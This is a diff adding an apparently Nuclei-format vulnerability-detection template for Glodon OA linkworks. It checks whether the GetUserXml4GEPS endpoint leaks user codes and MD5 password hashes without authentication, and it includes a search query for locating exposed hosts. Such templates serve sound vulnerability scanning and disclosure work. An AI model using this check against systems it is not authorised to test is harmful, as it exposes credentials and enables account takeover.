@@ -1,0 +1,30 @@
+id: glodon-linkworks-getuserxml4geps-infoleak
+
+info:
+  name: "广联达OA linkworks GetUserXml4GEPS 接口账号密码泄露"
+  author: linuxlz,pphua
+  severity: critical
+  reference:
+    - none
+  metadata:
+    hunter-query: web.body="/Services/Identification/"
+    veified: true
+  tags: 广联达OA
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Org/service/Service.asmx/GetUserXml4GEPS"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+        
+      - type: word
+        part: body
+        words:
+          - 'USR_PWDMD5'
+          - 'USR_CODE'
+        condition: and
